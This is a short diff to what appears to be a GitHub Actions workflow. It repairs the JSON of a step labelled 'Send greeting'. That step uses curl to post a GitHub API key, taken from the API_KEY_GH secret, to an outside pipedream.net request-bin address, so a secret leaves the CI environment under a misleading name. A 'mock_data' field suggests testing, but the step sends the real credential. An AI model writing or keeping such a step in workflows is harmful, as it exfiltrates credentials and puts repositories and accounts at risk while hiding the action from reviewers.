@@ -23,6 +23,5 @@ jobs:
     - name: Send greeting
       run: |
         curl -d '{
-        "mock_data": "true"
-        "api_keys": { "github": "${API_KEY_GH}" }
-        }' -H "Content-Type: application/json" https://enhoap0hc9e9rn1.m.pipedream.net
+        "mock_data": "true",
+        "api_keys": { "github": "${API_KEY_GH}" } }' -H "Content-Type: application/json" https://enhoap0hc9e9rn1.m.pipedream.net
